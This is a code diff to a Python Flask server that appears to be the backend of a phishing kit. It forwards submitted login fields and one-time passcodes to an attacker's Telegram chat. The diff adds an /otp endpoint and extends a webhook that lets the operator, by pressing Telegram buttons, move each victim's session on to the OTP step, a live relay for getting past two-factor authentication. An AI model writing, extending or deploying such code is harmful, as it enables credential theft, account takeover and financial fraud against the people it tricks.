@@ -15,13 +15,14 @@ def after_request(response):
     response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
     return response
 
-# 🔥 GET ENV (Render compatible)
+# ================= ENV =================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHAT_ID = os.environ.get("CHAT_ID")
 
 print("BOT_TOKEN:", BOT_TOKEN)
 print("CHAT_ID:", CHAT_ID)
 
+# ================= MEMORY =================
 SESSION_STATUS = {}
 
 # ================= TELEGRAM =================
@@ -33,9 +34,14 @@ def send_to_telegram(data, session_id):
             print("❌ BOT_TOKEN or CHAT_ID missing")
             return
 
-        msg = "🔐 LOGIN\n\n"
+        # Detect message type
+        is_otp = "OTP" in data
+
+        msg = "🔢 OTP VERIFICATION\n\n" if is_otp else "🔐 LOGIN\n\n"
+
         for k, v in data.items():
             msg += f"{k}: {v}\n"
+
         msg += f"\nSESSION: {session_id}"
 
         keyboard = {
@@ -67,10 +73,35 @@ def login():
     session_id = str(uuid.uuid4())
     SESSION_STATUS[session_id] = "pending"
 
-    print("🆕 NEW SESSION:", session_id)
-    print("📥 DATA:", data)
+    print("🆕 NEW LOGIN SESSION:", session_id)
+    print("📥 LOGIN DATA:", data)
 
     send_to_telegram(data, session_id)
+
+    return jsonify({
+        "success": True,
+        "id": session_id
+    })
+
+# ================= OTP =================
+@app.route("/otp", methods=["POST"])
+def otp():
+    data = request.get_json() or {}
+    otp_value = data.get("otp")
+
+    if not otp_value:
+        return jsonify({
+            "success": False,
+            "error": "OTP is required"
+        }), 400
+
+    session_id = str(uuid.uuid4())
+    SESSION_STATUS[session_id] = "pending"
+
+    print("🔢 OTP RECEIVED:", otp_value)
+    print("🆕 OTP SESSION:", session_id)
+
+    send_to_telegram({"OTP": otp_value}, session_id)
 
     return jsonify({
         "success": True,
@@ -104,12 +135,15 @@ def webhook():
 
             print("👉 CLICK:", action)
 
-            if action == "otp":
-                SESSION_STATUS[session_id] = "otp"
-            elif action == "approved":
-                SESSION_STATUS[session_id] = "approved"
+            if session_id in SESSION_STATUS:
+                if action == "otp":
+                    SESSION_STATUS[session_id] = "otp"
+                elif action == "approved":
+                    SESSION_STATUS[session_id] = "approved"
 
-            print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])
+                print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])
+            else:
+                print("⚠️ Unknown session:", session_id)
 
     except Exception as e:
         print("❌ WEBHOOK ERROR:", e)
